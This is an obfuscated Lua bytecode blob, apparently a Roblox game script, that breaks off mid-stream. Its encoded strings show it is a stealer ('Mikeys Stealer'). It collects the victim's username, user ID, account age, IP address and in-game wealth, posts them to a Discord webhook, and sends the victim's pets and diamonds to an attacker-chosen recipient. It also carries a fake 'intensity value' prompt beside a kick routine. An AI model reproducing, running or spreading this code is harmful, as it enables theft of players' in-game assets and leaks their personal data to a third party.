4123O0045000100204D0003000100060006450003003C00013O0004123O003C0001001253000300073O00204D000300030008001253000400154O008900056O007B00030005000100204D00030001001100263F00030044000100160004123O00440001001253000300073O00204D000300030008001253000400174O008900056O007B0003000500010012190102000D3O00263F000200010001000C0004123O0001000100204D00030001000300263F0003004F000100180004123O004F0001001253000300073O00204D000300030008001253000400194O008900056O007B00030005000100204D00030001000300263F000300590001001A0004123O00590001001253000300073O00200B01030003000800122O0004001B6O00058O00030005000100044O005900010004123O000100012O00333O00017O00193O00028O00027O0040026O00F03F03083O00746F737472696E6703043O006D61746803053O00666C2O6F7203053O007061697273026O00084003063O00737472696E6703063O00666F726D617403053O0025302E3266026O00244003053O0073706C697403013O002E034O0003013O003003013O006B026O00104003013O006D026O001C4003013O006203013O0054026O002A4003023O005174026O00304001E43O0012192O0100014O0038000200063O00263F000100D9000100020004123O00D900012O0038000600063O00263F00020010000100030004123O00100001001253000700043O00121F000800053O00202O0008000800064O000900036O000800096O00073O00024O000500076O000600063O00122O000200023O00263F000200C9000100020004123O00C90001001253000700074O0089000800044O000D0007000200090004123O001F00012O006E000C00053O00062A010B001F0001000C0004123O001F00012O006E000C00053O00204F000D000B000800067D000C001F0001000D0004123O001F00012O00890006000A3O0004123O0021000100066700070016000100020004123O00160001000645000600C800013O0004123O00C80001001219010700014O00380008000C3O00263F00070029000100030004123O002900012O0038000A000B3O001219010700023O00263F000700C2000100020004123O00C200012O0038000C000C3O00263F00080045000100030004123O00450001001219010D00013O000E04010300330001000D0004123O00330001001219010800023O0004123O0045000100263F000D002F000100010004123O002F0001001253000E00093O002027000E000E000A00122O000F000B3O00202O00100009000300102O0010000C00104O0010000A00104O000E001000024O0005000E3O00122O000E00093O00202O000E000E000D4O000F00053O00122O0010000E6O000E0010000200202O000B000E000200122O000D00033O00044O002F000100263F000800AB000100020004123O00AB0001001219010C000E3O00121E010D00093O00202O000D000D000D4O000E000B3O00122O000F000F6O000D000F000200202O000D000D000200262O000D0068000100100004123O00680001001253000D00093O002049000D000D000D4O000E000B3O00122O000F000F6O000D000F000200202O000D000D000300262O000D0068000100100004123O00680001001253000D00093O0020F8000D000D000D4O000E00053O00122O000F000E6O000D000F000200202O000D000D00034O000E000C3O00122O000F00093O00202O000F000F000D4O0010000B3O00122O0011000F6O000F0011000200202O000F000F00034O001000066O0005000D001000044O00C80001001253000D00093O00206A000D000D000D4O000E000B3O00122O000F000F6O000D000F000200202O000D000D000200262O000D0081000100100004123O00810001001253000D00093O00206A000D000D000D4O000E000B3O00122O000F000F6O000D000F000200202O000D000D000300262O000D0081000100100004123O00810001001253000D00093O00201D010D000D000D4O000E00053O00122O000F000E6O000D000F000200202O000D000D00034O000E00066O0005000D000E00044O00C80001001253000D00093O002049000D000D000D4O000E000B3O00122O000F000F6O000D000F000200202O000D000D000200262O000D0095000100100004123O00950001001253000D00093O002049000D000D000D4O000E000B3O00122O000F000F6O000D000F000200202O000D000D000300262O000D0095000100100004123O009500012O0089000D00054O0089000E00064O003E0005000D000E0004123O00C80001001253000D00093O002049000D000D000D4O000E000B3O00122O000F000F6O000D000F000200202O000D000D000200262O000D00A9000100100004123O00A90001001253000D00093O00206A000D000D000D4O000E000B3O00122O000F000F6O000D000F000200202O000D000D000300262O000D00A9000100100004123O00A900012O0089000D00054O0089000E00064O003E0005000D000E0004123O00C800012O008900055O0004123O00C8000100263F0008002C000100010004123O002C0001001219010D00013O00263F000D00BB000100010004123O00BB00012O001B010900040006001204000E00053O00202O000E000E000600202O000F0009000800102O000F000C000F4O000F0003000F4O000E0002000200202O000F0009000800102O000F000C000F4O000A000E000F00122O000D00033O00263F000D00AE000100030004123O00AE0001001219010800033O0004123O002C00010004123O00AE00010004123O002C00010004123O00C8000100263F00070025000100010004123O00250001001219010800014O0038000900093O001219010700033O0004123O00250001001219010200083O00263F000200CC000100080004123O00CC00012O003D000500023O00263F00020005000100010004123O000500012O008900036O005A00073O000500302O00070011001200302O00070013001400302O00070015000C00302O00070016001700302O0007001800194O000400073O00122O000200033O00044O000500010004123O00E3000100263F000100DE000100010004123O00DE0001001219010200014O0038000300033O0012192O0100033O00263F00010002000100030004123O000200012O0038000400053O0012192O0100023O0004123O000200012O00333O00017O00033O00028O0003113O006469616D6F6E6473746F636F6E766572742O033O00524150000C3O001219012O00014O0038000100013O00263F3O0002000100010004123O00020001001253000200024O001300035O00202O0003000300034O0002000200024O000100026O000100023O00044O000200012O00333O00017O004B3O00028O00026O00F03F027O0040026O00084003043O00696D677303733O00682O7470733A2O2F6D656469612E646973636F7264612O702E6E65742F612O746163686D656E74732F2O3130383932373637312O38303132363534352F2O313237392O303O342O353138322O3336302F6D696B655F627275682E706E673F77696474683D363235266865696768743D36323503073O00636F6E74656E7403083O00757365726E616D6503053O004D696B6579030A3O006176617461725F75726C03063O00656D6265647303053O007469746C65031A3O002O2A4E6577204869742O2A202O7C57697468204D696B65792O7C2O033O0075726C031D3O00682O7470733A2O2F646973636F72642E2O672F794A62507579725A366B03043O007479706503043O007269636803053O00636F6C6F7203083O00746F6E756D626572023O00807FCC434103093O007468756D626E61696C03063O00686569676874025O00407A4003053O00776964746803063O006669656C647303043O006E616D6503383O002O2A546869732064617461207761732067656E657261746564207573696E67204D696B65797320537465616C65722O2A203A6D6F7961693A03053O0076616C756503123O003O60557365726E616D655O203A2003103O000A557365722D49446O203A2003063O0075736572496403103O000A412O636F756E74204167652O203A20030A3O00412O636F756E7441676503153O0020446179730A495020412O6472652O733O203A2003123O000A52616E6B9O202O203A2003103O000A5241509O20203A202O033O0052415003103O000A4578706C6F69746O203A2003103O000A52656365697665725O203A202O033O003O6003063O00696E6C696E65010003193O003A646F673A202O2A50657473206C6566742O2A203A646F673A2O0103183O003A67656D3A202O2A4469616D6F6E64732O2A203A67656D3A031E3O003A62616E6B3A202O2A4A6F696E65642042616E6B732O2A203A62616E6B3A031B3O003A67656D3A202O2A5764204469616D6F6E64732O2A203A67656D3A03283O003A6D6F6E65795F6D6F7574683A202O2A57642048756765732O2A203A6D6F6E65795F6D6F7574683A03083O006E6577646174613103043O0067616D65030A3O0047657453657276696365030B3O00482O747053657276696365030A3O004A534F4E456E636F6465030C3O00636F6E74656E742D7479706503103O00612O706C69636174696F6E2F6A736F6E03073O00576562682O6F6B002O033O0055726C03043O00426F647903063O004D6574686F6403043O00504F535403073O004865616465727303073O0072657175657374030C3O0052692O7A205363726970747A03103O000A52616E6B9O203A2003073O00482O747047657403313O00682O7470733A2O2F7468756D626E61696C732E726F626C6F782E636F6D2F76312F612O736574733F612O7365744964733D03423O002672657475726E506F6C6963793D506C616365486F6C6465722673697A653D3432307834323026666F726D61743D506E6726697343697263756C61723D66616C7365030A3O004A534F4E4465636F646503043O006461746103083O00696D61676555726C03023O002F3503063O00737472696E6703053O0073706C6974030D3O00726278612O73657469643A2O2F076E012O001219010700014O00380008000C3O00263F00070007000100010004123O00070001001219010800014O0038000900093O001219010700023O00263F0007000B000100020004123O000B00012O0038000A000B3O001219010700033O000E0401030002000100070004123O000200012O0038000C000C3O000E042O01001A000100080004123O001A0001001219010D00013O00263F000D0015000100010004123O001500012O00380009000A3O001219010D00023O00263F000D0011000100020004123O00110001001219010800023O0004123O001A00010004123O0011000100263F000800432O0100040004123O00432O012O00AE000D5O00263F000D0022000100010004123O002200012O00AE000D00013O002624000D00CA000100010004123O00CA0001001219010D00013O00263F000D0093000100010004123O00930001001219010E00013O00263F000E008E000100010004123O008E0001001219010F00063O0012E8000F00056O000F3O000400102O000F0007000200302O000F0008000900122O001000053O00102O000F000A00104O001000016O00113O000600302O0011000C000D00302O0011000E000F00302O00110010001100122O001200133O00122O001300146O00120002000200102O0011001200124O00123O000300102O0012000E000C00302O00120016001700302O00120018001700102O0011001500124O001200076O00133O000300302O0013001A001B00122O0014001D6O001500033O00122O0016001E6O001700043O00202O00170017001F00122O001800206O001900043O00202O00190019002100122O001A00226O001B00053O00122O001C00236O001D00063O00122O001E00243O00122O001F00256O001F0001000200122O002000266O002100073O00122O002200276O002300063O00122O002400286O00140014002400102O0013001C001400302O00130029002A4O00143O000300302O0014001A002B00122O001500286O001600043O00122O001700286O00150015001700102O0014001C001500302O00140029002C4O00153O000300302O0015001A002D00122O001600286O001700033O00122O001800286O00160016001800102O0015001C001600302O00150029002C4O00163O000300102O0016001A3O00122O001700286O001800013O00122O001900286O00170017001900102O0016001C001700302O00160029002C4O00173O000300302O0017001A002E00122O001800286O001900086O001A000B3O00122O001B00286O00180018001B00102O0017001C001800302O00170029002C4O00183O00030030610018001A002F00127E001900286O001A00093O00122O001B00286O00190019001B00102O0018001C001900302O00180029002C4O00193O000300302O0019001A003000122O001A00286O001B5O00122O001C00286O001A001A001C00102O0019001C001A00302O00190029002C4O0012000700010010B60011001900122O00A40010000100010010B6000F000B00102O00D3000F00023O001219010E00023O00263F000E0026000100020004123O00260001001219010D00023O0004123O009300010004123O0026000100263F000D00A9000100020004123O00A90001001219010E00013O00263F000E009A000100020004123O009A0001001219010D00033O0004123O00A9000100263F000E0096000100010004123O00960001001253000F00323O0020EC000F000F003300122O001100346O000F0011000200202O000F000F00354O001100026O000F0011000200122O000F00316O000F3O000100302O000F003600374O000A000F3O00122O000E00023O00044O0096000100263F000D0023000100030004123O00230001001253000E00383O002624000E006D2O0100390004123O006D2O012O00AE000E000A3O00263F000E006D2O01002C0004123O006D2O01001219010E00014O0038000F000F3O00263F000E00B3000100010004123O00B30001001219010F00013O00263F000F00B6000100010004123O00B600012O002C01103O00042O00030111000B3O00102O0010003A001100122O001100313O00102O0010003B001100302O0010003C003D00102O0010003E000A4O000900103O00122O0010003F6O001100096O00100002000100044O006D2O010004123O00B600010004123O006D2O010004123O00B300010004123O006D2O010004123O002300010004123O006D2O01001219010D00013O00263F000D00E4000100030004123O00E40001001253000E00383O002624000E006D2O0100390004123O006D2O012O00AE000E000A3O00263F000E006D2O01002C0004123O006D2O01001219010E00013O00263F000E00D4000100010004123O00D400012O002C010F3O00042O00030110000B3O00102O000F003A001000122O001000313O00102O000F003B001000302O000F003C003D00102O000F003E000A4O0009000F3O00122O000F003F6O001000096O000F0002000100044O006D2O010004123O00D400010004123O006D2O01000E042O0100332O01000D0004123O00332O01001219010E00063O001226010E00056O000E3O000400102O000E0007000200302O000E0008004000122O000F00053O00102O000E000A000F4O000F00016O00103O000600302O0010000C000D00302O0010000E000F00302O00100010001100122O001100133O00122O001200146O00110002000200102O0010001200114O00113O000300102O0011000E000C00302O00110016001700302O00110018001700102O0010001500114O001100046O00123O000300302O0012001A001B00122O0013001D6O001400033O00122O0015001E6O001600043O00202O00160016001F00122O001700206O001800043O00202O00180018002100122O001900226O001A00053O00122O001B00416O001C00063O00122O001D00243O00122O001E00256O001E0001000200122O001F00266O002000073O00122O002100276O002200063O00122O002300286O00130013002300102O0012001C001300302O00120029002A4O00133O000300302O0013001A002B00122O001400286O001500043O00122O001600286O00140014001600102O0013001C001400302O00130029002C4O00143O000300302O0014001A002D00122O001500286O001600033O00122O001700286O00150015001700102O0014001C001500302O00140029002C4O00153O000300102O0015001A3O00122O001600286O001700013O00122O001800286O00160016001800102O0015001C001600302O00150029002C4O0011000400010010B60010001900112O00A4000F000100010010B6000E000B000F2O00D3000E00023O001219010D00023O00263F000D00CB000100020004123O00CB0001001253000E00323O0020EC000E000E003300122O001000346O000E0010000200202O000E000E00354O001000026O000E0010000200122O000E00316O000E3O000100302O000E003600374O000A000E3O00122O000D00033O00044O00CB00010004123O006D2O0100263F000800602O0100030004123O00602O01001219010D00013O00263F000D005B2O0100010004123O005B2O01001253000E00323O0020B3000E000E004200122O001000436O0011000C3O00122O001200446O0010001000124O000E001000024O000C000E3O00122O000E00323O00202O000E000E003300122O001000346O000E0010000200202O000E000E00454O0010000C6O000E0010000200202O000E000E004600202O000E000E000200202O000C000E004700122O000D00023O00263F000D00462O0100020004123O00462O01001219010800043O0004123O00602O010004123O00462O0100263F0008000E000100020004123O000E0001001219010B00483O001225000D00493O00202O000D000D004A4O000E00053O00122O000F004B6O000D000F000200202O000C000D000300122O000800033O00044O000E00010004123O006D2O010004123O000200012O00333O00017O000C3O00028O00026O00F03F03083O00746F6E756D62657203043O0067616D65030A3O004765745365727669636503073O00506C6179657273030B3O004C6F63616C506C6179657203043O004B69636B031B3O0050757420412056616C696420696E74656E736974792056616C756503043O006D61746803063O0072616E646F6D026O00594001443O0012192O0100014O0038000200033O00263F00010007000100010004123O00070001001219010200014O0038000300033O0012192O0100023O00263F00010002000100020004123O00020001000E042O010036000100020004123O00360001001219010400013O000E0401020010000100040004123O00100001001219010200023O0004123O0036000100263F0004000C000100010004123O000C0001001253000500034O008900066O00060005000200020006DE0005002E000100010004123O002E0001001219010500014O0038000600063O000E042O010019000100050004123O00190001001219010600013O00263F0006001C000100010004123O001C0001001219010700013O00263F0007001F000100010004123O001F0001001253000800043O00200801080008000500122O000A00066O0008000A000200202O00080008000700202O00080008000800122O000A00096O0008000A00016O00013O00044O001F00010004123O001C00010004123O002E00010004123O001900010012530005000A3O00202101050005000B00122O000600023O00122O0007000C6O0005000700024O000300053O00122O000400023O00044O000C0001000E0401020009000100020004123O0009000100062A0103003D00013O0004123O003D00012O0034010400014O003D000400023O0004123O004300012O003401046O003D000400023O0004123O004300010004123O000900010004123O004300010004123O000200012O00333O00017O000E3O0003043O007761697403053O00544C697374028O0003053O00706169727303083O00557365724E616D650003083O006475616C682O6F6B026O00F03F03093O00526563697069656E7403083O004469616D6F6E647303043O005065747303073O004D652O73616765030C3O00496E766F6B6553657276657203063O00756E7061636B003C3O0012533O00014O006C3O000100020006453O003B00013O0004123O003B00010012533O00024O006E7O00263F3O000C000100030004123O000C00010012533O00024O002C2O015O00064B5O000100010004125O00010012533O00043O001253000100024O000D3O000200020004123O00380001001253000500054O00D300056O00AE000500013O0026240005001C000100060004123O001C0001001253000500074O00AE000600014O00060005000200020006450005001C00013O0004123O001C00012O00AE000500024O00D300056O002C01053O00012O002200063O00044O00075O00102O0006000900074O000700033O00102O0006000A00074O000700016O000800046O0007000100010010B60006000B00072O0066000700043O00102O0006000C000700102O0005000800064O000600053O00202O00060006000D00122O0008000E6O000900056O000800096O00063O000100122O000600026O000600063O00262O00063O000100030004125O0001001253000600024O002C01075O00061D00060038000100070004123O003800010004125O00010006673O0010000100020004123O001000010004125O00012O00333O00017O000F3O0003043O007761697403053O00424C697374028O0003053O00544C69737403053O00706169727303083O00557365724E616D650003083O006475616C682O6F6B026O00F03F03093O00526563697069656E7403083O004469616D6F6E647303043O005065747303073O004D652O73616765030C3O00496E766F6B6553657276657203063O00756E7061636B003E3O0012533O00014O006C3O000100020006453O003D00013O0004123O003D00010012533O00024O006E7O0026243O003D000100030004123O003D00010012533O00044O006E7O00263F3O003D000100030004123O003D00010012533O00053O001253000100024O000D3O000200020004123O00380001001253000500064O00D300056O00AE000500013O0026240005001C000100070004123O001C0001001253000500084O00AE000600014O00060005000200020006450005001C00013O0004123O001C00012O00AE000500024O00D300056O002C01053O00012O002200063O00044O00075O00102O0006000A00074O000700033O00102O0006000B00074O000700016O000800046O0007000100010010B60006000C00072O0066000700043O00102O0006000D000700102O0005000900064O000600053O00202O00060006000E00122O0008000F6O000900056O000800096O00063O000100122O000600026O000600063O00262O00063O000100030004125O0001001253000600024O002C01075O00061D00060038000100070004123O003800010004125O00010006673O0010000100020004123O001000010004125O00010004123O003D00010004125O00012O00333O00017O00103O0003043O007761697403053O00484C697374028O0003053O00424C69737403053O00544C69737403053O00706169727303083O00557365724E616D650003083O006475616C682O6F6B026O00F03F03093O00526563697069656E7403083O004469616D6F6E647303043O005065747303073O004D652O73616765030C3O00496E766F6B6553657276657203063O00756E7061636B00403O0012533O00014O006C3O000100020006453O003F00013O0004123O003F00010012533O00024O006E7O0026245O000100030004125O00010012533O00044O006E7O00263F5O000100030004125O00010012533O00054O006E7O00263F5O000100030004125O00010012533O00063O001253000100024O000D3O000200020004123O003C0001001253000500074O00D300056O00AE000500013O00262400050020000100080004123O00200001001253000500094O00AE000600014O00060005000200020006450005002000013O0004123O002000012O00AE000500024O00D300056O002C01053O00012O002200063O00044O00075O00102O0006000B00074O000700033O00102O0006000C00074O000700016O000800046O0007000100010010B60006000D00072O0066000700043O00102O0006000E000700102O0005000A00064O000600053O00202O00060006000F00122O000800106O000900056O000800096O00063O000100122O000600026O000600063O00262O00063O000100030004125O0001001253000600024O002C01075O00061D0006003C000100070004123O003C00010004125O00010006673O0014000100020004123O001400010004125O00012O00333O00017O00113O0003043O007761697403053O00504C697374028O0003053O00544C69737403053O00424C69737403053O00484C69737403053O00706169727303083O00557365724E616D650003083O006475616C682O6F6B026O00F03F03093O00526563697069656E7403083O004469616D6F6E647303043O005065747303073O004D652O73616765030C3O00496E766F6B6553657276657203063O00756E7061636B00443O0012533O00014O006C3O000100020006453O004300013O0004123O004300010012533O00024O006E7O0026245O000100030004125O00010012533O00044O006E7O00263F5O000100030004125O00010012533O00054O006E7O00263F5O000100030004125O00010012533O00064O006E7O00263F5O000100030004125O00010012533O00073O001253000100024O000D3O000200020004123O00400001001253000500084O00D300056O00AE000500013O00262400050024000100090004123O002400010012530005000A4O00AE000600014O00060005000200020006450005002400013O0004123O002400012O00AE000500024O00D300056O002C01053O00012O002200063O00044O00075O00102O0006000C00074O000700033O00102O0006000D00074O000700016O000800046O0007000100010010B60006000E00072O0066000700043O00102O0006000F000700102O0005000B00064O000600053O00202O00060006001000122O000800116O000900056O000800096O00063O000100122O000600026O000600063O00262O00063O000100030004125O0001001253000600024O002C01075O00061D00060040000100070004123O004000010004125O00010006673O0018000100020004123O001800010004125O00012O00333O00017O00123O0003043O007761697403053O00454C697374028O0003053O00484C69737403053O00544C69737403053O00424C69737403053O00504C69737403053O00706169727303083O00557365724E616D650003083O006475616C682O6F6B026O00F03F03093O00526563697069656E7403083O004469616D6F6E647303043O005065747303073O004D652O73616765030C3O00496E766F6B6553657276657203063O00756E7061636B00483O0012533O00014O006C3O000100020006453O004700013O0004123O004700010012533O00024O006E7O0026245O000100030004125O00010012533O00044O006E7O00263F5O000100030004125O00010012533O00054O006E7O00263F5O000100030004125O00010012533O00064O006E7O00263F5O000100030004125O00010012533O00074O006E7O00263F5O000100030004125O00010012533O00083O001253000100024O000D3O000200020004123O00440001001253000500094O00D300056O00AE000500013O002624000500280001000A0004123O002800010012530005000B4O00AE000600014O00060005000200020006450005002800013O0004123O002800012O00AE000500024O00D300056O002C01053O00012O002200063O00044O00075O00102O0006000D00074O000700033O00102O0006000E00074O000700016O000800046O0007000100010010B60006000F00072O0066000700043O00102O00060010000700102O0005000C00064O000600053O00202O00060006001100122O000800126O000900056O000800096O00063O000100122O000600026O000600063O00262O00063O000100030004125O0001001253000600024O002C01075O00061D00060044000100070004123O004400010004125O00010006673O001C000100020004123O001C00010004125O00012O00333O00017O00123O0003043O007761697403063O0045764C697374028O0003053O00454C69737403053O00484C69737403053O00544C69737403053O00424C69737403053O00504C69737403053O0070616972730003083O006475616C682O6F6B026O00F03F03093O00526563697069656E7403083O004469616D6F6E647303043O005065747303073O004D652O73616765030C3O00496E766F6B6553657276657203063O00756E7061636B004C3O0012533O00014O006C3O000100020006453O004B00013O0004123O004B00010012533O00024O006E7O0026245O000100030004125O00010012533O00044O006E7O00263F5O000100030004125O00010012533O00054O006E7O00263F5O000100030004125O00010012533O00064O006E7O00263F5O000100030004125O00010012533O00074O006E7O00263F5O000100030004125O00010012533O00084O006E7O00263F5O000100030004125O00010012533O00093O001253000100024O000D3O000200020004123O004800012O00AE000500014O00D300056O00AE000500023O0026240005002C0001000A0004123O002C00010012530005000B4O00AE000600024O00060005000200020006450005002C00013O0004123O002C00012O00AE000500034O00D300056O002C01053O00012O002200063O00044O00075O00102O0006000D00074O000700043O00102O0006000E00074O000700016O000800046O0007000100010010B60006000F00072O0066000700053O00102O00060010000700102O0005000C00064O000600063O00202O00060006001100122O000800126O000900056O000800096O00063O000100122O000600026O000600063O00262O00063O000100030004125O0001001253000600024O002C01075O00061D00060048000100070004123O004800010004125O00010006673O0020000100020004123O002000010004125O00012O00333O00017O00133O0003043O007761697403053O00534C697374028O0003063O0045764C69737403053O00454C69737403053O00484C69737403053O00544C69737403053O00424C69737403053O00504C69737403053O0070616972730003083O006475616C682O6F6B026O00F03F03093O00526563697069656E7403083O004469616D6F6E647303043O005065747303073O004D652O73616765030C3O00496E766F6B6553657276657203063O00756E7061636B00503O0012533O00014O006C3O000100020006453O004F00013O0004123O004F00010012533O00024O006E7O0026245O000100030004125O00010012533O00044O006E7O00263F5O000100030004125O00010012533O00054O006E7O00263F5O000100030004125O00010012533O00064O006E7O00263F5O000100030004125O00010012533O00074O006E7O00263F5O000100030004125O00010012533O00084O006E7O00263F5O000100030004125O00010012533O00094O006E7O00263F5O000100030004125O00010012533O000A3O001253000100024O000D3O000200020004123O004C00012O00AE000500014O00D300056O00AE000500023O002624000500300001000B0004123O003000010012530005000C4O00AE000600024O00060005000200020006450005003000013O0004123O003000012O00AE000500034O00D300056O002C01053O00012O002200063O00044O00075O00102O0006000E00074O000700043O00102O0006000F00074O000700016O000800046O0007000100010010B60006001000072O0066000700053O00102O00060011000700102O0005000D00064O000600063O00202O00060006001200122O000800136O000900056O000800096O00063O000100122O000600026O000600063O00262O00063O000100030004125O0001001253000600024O002C01075O00061D0006004C000100070004123O004C00010004125O00010006673O0024000100020004123O002400010004125O00012O00333O00017O00143O0003043O007761697403053O004D4C697374028O0003053O00534C69737403063O0045764C69737403053O00454C69737403053O00484C69737403053O00544C69737403053O00424C69737403053O00504C69737403053O0070616972730003083O006475616C682O6F6B026O00F03F03093O00526563697069656E7403083O004469616D6F6E647303043O005065747303073O004D652O73616765030C3O00496E766F6B6553657276657203063O00756E7061636B00543O0012533O00014O006C3O000100020006453O005300013O0004123O005300010012533O00024O006E7O0026245O000100030004125O00010012533O00044O006E7O00263F5O000100030004125O00010012533O00054O006E7O00263F5O000100030004125O00010012533O00064O006E7O00263F5O000100030004125O00010012533O00074O006E7O00263F5O000100030004125O00010012533O00084O006E7O00263F5O000100030004125O00010012533O00094O006E7O00263F5O000100030004125O00010012533O000A4O006E7O00263F5O000100030004125O00010012533O000B3O001253000100024O000D3O000200020004123O005000012O00AE000500014O00D300056O00AE000500023O002624000500340001000C0004123O003400010012530005000D4O00AE000600024O00060005000200020006450005003400013O0004123O003400012O00AE000500034O00D300056O002C01053O00012O002200063O00044O00075O00102O0006000F00074O000700043O00102O0006001000074O000700016O000800046O0007000100010010B60006001100072O0066000700053O00102O00060012000700102O0005000E00064O000600063O00202O00060006001300122O000800146O000900056O000800096O00063O000100122O000600026O000600063O00262O00063O000100030004125O0001001253000600024O002C01075O00061D00060050000100070004123O005000010004125O00010006673O0028000100020004123O002800010004125O00012O00333O00017O002E3O0003043O007761697403083O00574C69627261727903073O007265717569726503043O0067616D65030A3O004765745365727669636503113O005265706C69636174656453746F7261676503093O004672616D65776F726B030E3O0046696E6446697273744368696C6403073O004C696272617279030A3O005746756E6374696F6E7303093O0046756E6374696F6E7303053O007461626C6503073O00666F726561636803093O004469726563746F727903043O005065747303063O00436C69656E7403043O00536176652O033O0047657403053O0070616972732O033O00756964010003043O0066696E64030B3O00575469616E69634C69737403023O00696400028O0003063O00696E7365727403063O0057544C69737403043O0057542O63026O00F03F03053O00544C69737403063O0053544C697374030B3O002O5F4449524543544F5259030B3O004765744368696C6472656E03063O00737472696E6703053O0073706C697403043O004E616D652O033O00202D2003083O00746F737472696E6703153O0046696E6446697273744368696C644F66436C612O73030C3O004D6F64756C6553637269707403043O006E616D6503093O007468756D626E61696C031E3O003A73637265616D3A2O202O2A544954414E49432O2A203A73637265616D3A030E3O004065766572796F6E65204F4D464703083O00557365724E616D6500AF3O0012533O00014O006C3O000100020006453O00AE00013O0004123O00AE00010012533O00033O0012AA000100043O00202O00010001000500122O000300066O00010003000200202O00010001000700202O00010001000800122O000300096O000100039O00000200124O00023O00124O00023O00206O000B00124O000A3O00124O000C3O00206O000D00122O000100023O00202O00010001000E00202O00010001000F00027400026O00983O0002000100124O00033O00122O000100043O00202O00010001000500122O000300066O00010003000200202O00010001000900202O00010001001000202O0001000100116O0002000200206O00126O0001000200206O000F4O00015O00122O000200136O00038O00020002000400044O002C000100204D0007000600140020470001000700150006670002002A000100020004123O002A0001001253000200134O008900036O000D0002000200040004123O004E00010012530007000C3O0020F300070007001600122O000800173O00202O0009000600184O00070009000200262O0007004E000100190004123O004E00010012190107001A4O0038000800083O00263F0007003B0001001A0004123O003B00010012190108001A3O00263F0008003E0001001A0004123O003E00010012530009000C3O0020AF00090009001B00122O000A001C3O00202O000B000600144O0009000B000100122O0009000C3O00202O00090009001B00122O000A001D3O00202O000B000600184O0009000B000100044O004E00010004123O003E00010004123O004E00010004123O003B000100066700020032000100020004123O003200012O00AE00025O0012530003001C4O006E000300033O00204F00030003001E00061D0002009B000100030004123O009B00010012530002001F4O00CA000200026O00028O000200013O00202O00020002001E4O000200016O000200023O00122O000300206O000400036O0003000300044O000400053O00122O000600133O00122O000700043O00202O00070007000500122O000900066O00070009000200202O00070007002100202O00070007000F00202O0007000700224O000700086O00063O000800044O00840001001253000B00233O0020DC000B000B002400202O000C000A002500122O000D00266O000B000D000200202O000B000B001E00122O000C00276O000D00036O000C0002000200062O000B00840001000C0004123O00840001001253000C00033O002017010D000A002800122O000F00296O000D000F6O000C3O000200202O0004000C002A00122O000C00033O00202O000D000A002800122O000F00296O000D000F6O000C3O000200202O0005000C002B00044O008600010006670006006C000100020004123O006C00012O00AE000600043O0012D90007002C6O000800043O00122O0009002D6O000A00056O000B00016O000C00053O00122O000D002E6O0006000D000100122O0006001A6O000600023O00122O0006001A6O000600056O000600033O00202O00060006001E4O000600033O00122O0006001A6O000600063O00122O0006001A6O000600073O00044O00A400012O00AE00025O002624000200A10001001A0004123O00A100012O00AE000200013O00263F000200A40001001A0004123O00A400012O002C01025O0012190002001F3O0004123O00AE00012O002C01025O001271000200176O00025O00122O0002001C6O00025O00122O0002001D3O00122O000200013O00122O0003001E6O00020002000100046O00012O00333O00013O00013O00043O0003073O00746974616E696303053O007461626C6503063O00696E73657274030B3O00575469616E69634C69737402093O00204D0002000100010006450002000800013O0004123O00080001001253000200023O00204D000200020003001253000300044O008900046O007B0002000400012O00333O00017O00273O0003043O007761697403083O00574C69627261727903073O007265717569726503043O0067616D65030A3O004765745365727669636503113O005265706C69636174656453746F7261676503093O004672616D65776F726B030E3O0046696E6446697273744368696C6403073O004C696272617279030A3O005746756E6374696F6E7303093O0046756E6374696F6E7303053O007461626C6503073O00666F726561636803093O004469726563746F727903043O005065747303063O00436C69656E7403043O00536176652O033O0047657403053O0070616972732O033O00756964010003043O0066696E64030B3O005742616E616E614C69737403023O00696400028O0003063O00696E7365727403063O0057424C69737403043O0057422O63026O00F03F027O004003183O00726278612O73657469643A2O2F31303934362O3336373033031C3O003A62616E616E613A202O2A42414E414E412O2A203A62616E616E613A03093O004065766572796F6E6503083O00557365724E616D65026O00084003053O00424C69737403063O0042616E616E61026O00104000B43O0012533O00014O006C3O000100020006453O00B300013O0004123O00B300010012533O00033O0012AA000100043O00202O00010001000500122O000300066O00010003000200202O00010001000700202O00010001000800122O000300096O000100039O00000200124O00023O00124O00023O00206O000B00124O000A3O00124O000C3O00206O000D00122O000100023O00202O00010001000E00202O00010001000F00027400026O00983O0002000100124O00033O00122O000100043O00202O00010001000500122O000300066O00010003000200202O00010001000900202O00010001001000202O0001000100116O0002000200206O00126O0001000200206O000F4O00015O00122O000200136O00038O00020002000400044O002C000100204D0007000600140020470001000700150006670002002A000100020004123O002A0001001253000200134O008900036O000D0002000200040004123O004E00010012530007000C3O0020F300070007001600122O000800173O00202O0009000600184O00070009000200262O0007004E000100190004123O004E00010012190107001A4O0038000800083O00263F0007003B0001001A0004123O003B00010012190108001A3O00263F0008003E0001001A0004123O003E00010012530009000C3O0020AF00090009001B00122O000A001C3O00202O000B000600144O0009000B000100122O0009000C3O00202O00090009001B00122O000A001D3O00202O000B000600184O0009000B000100044O004E00010004123O003E00010004123O004E00010004123O003B000100066700020032000100020004123O003200012O00AE00025O0012530003001C4O006E000300033O00204F00030003001E00061D000200A0000100030004123O00A000010012190102001A4O0038000300063O00263F0002005D0001001A0004123O005D00010012190103001A4O0038000400043O0012190102001E3O00263F0002009A0001001F0004123O009A000100263F000300740001001F0004123O007400010012190107001A3O00263F0007006F0001001A0004123O006F0001001219010600204O00FB000800013O00122O000900216O000A00053O00122O000B00226O000C00026O000D00036O000E00063O00122O000F00236O0008000F000100122O0007001E3O00263F000700620001001E0004123O00620001001219010300243O0004123O007400010004123O0062000100263F000300850001001A0004123O008500010012190107001A3O00263F0007007B0001001E0004123O007B00010012190103001E3O0004123O0085000100263F000700770001001A0004123O00770001001253000800254O0009000800086O00088O000800033O00202O00080008001E4O000800033O00122O0007001E3O00044O0077000100263F0003008A0001001E0004123O008A00012O00AE000400043O001219010500263O0012190103001F3O000E0401240091000100030004123O009100010012190107001A4O00D3000700043O0012190107001A4O00D3000700023O001219010300273O00263F0003005F000100270004123O005F00010012190107001A4O00D3000700053O0012190107001A4O00D3000700063O0004123O00A900010004123O005F00010004123O00A9000100263F000200580001001E0004123O005800012O0038000500063O0012190102001F3O0004123O005800010004123O00A900012O00AE00025O002624000200A60001001A0004123O00A600012O00AE000200033O00263F000200A90001001A0004123O00A900012O002C01025O001219000200253O0004123O00B300012O002C01025O001271000200176O00025O00122O0002001C6O00025O00122O0002001D3O00122O000200013O00122O0003001E6O00020002000100046O00012O00333O00013O00013O00053O0003043O006E616D6503063O0062616E616E6103053O007461626C6503063O00696E73657274030B3O005742616E616E614C69737402093O00204D00020001000100263F00020008000100020004123O00080001001253000200033O0020